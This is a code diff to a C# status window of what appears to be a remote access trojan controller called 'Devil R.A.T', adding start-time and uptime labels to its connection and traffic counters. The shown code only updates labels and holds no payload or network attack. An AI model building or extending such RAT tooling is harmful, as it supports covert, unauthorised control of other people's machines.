@@ -23,18 +23,34 @@ namespace dvrat
             title_label.Text = $"Devil R.A.T {this.ProductVersion}";
         }
 
-        public void SetStatus(int AllRecv, int AllSend, int AllConnections, int AllDisconnect)
+        public void SetStatus(int AllRecv, int AllSend, int AllConnections, int AllDisconnect, string starts_time, string time_up)
         {
-            new Thread(new ThreadStart(()=> {
-                Invoke(new MethodInvoker(() => {
+                new Thread(new ThreadStart(() =>
+                {
+                    try
+                    {
+                        Invoke(new MethodInvoker(() =>
+                        {
+                            try
+                            {
+                                recv_label.Text = $"Recv: {AllRecv.ToString("#,##0").Replace(',', '.')}";
+                                send_label.Text = $"Send: {AllSend.ToString("#,##0").Replace(',', '.')}";
+                                connect_label.Text = $"Connects: {AllConnections.ToString("#,##0").Replace(',', '.')}";
+                                disconnect_label.Text = $"Disconnects: {AllDisconnect.ToString("#,##0").Replace(',', '.')}";
+                                start_time_label.Text = $"Starts At: {starts_time}";
+                                time_up_label.Text = $"Time Up: {time_up}";
+                            }
+                            catch (Exception ex)
+                            {
+                                throw (ex);
+                            }
+                        }));
+                    }catch(Exception ex)
+                    {
+                        throw (ex);
+                    }
 
-                    recv_label.Text = $"Recv: {AllRecv.ToString("#,##0").Replace(',', '.')}";
-                    send_label.Text = $"Send: {AllSend.ToString("#,##0").Replace(',', '.')}";
-                    connect_label.Text = $"Connects: {AllConnections.ToString("#,##0").Replace(',', '.')}";
-                    disconnect_label.Text = $"Disconnects: {AllDisconnect.ToString("#,##0").Replace(',', '.')}";
-
-                }));
-            })).Start(); 
+                })).Start();
         }
     }
 }
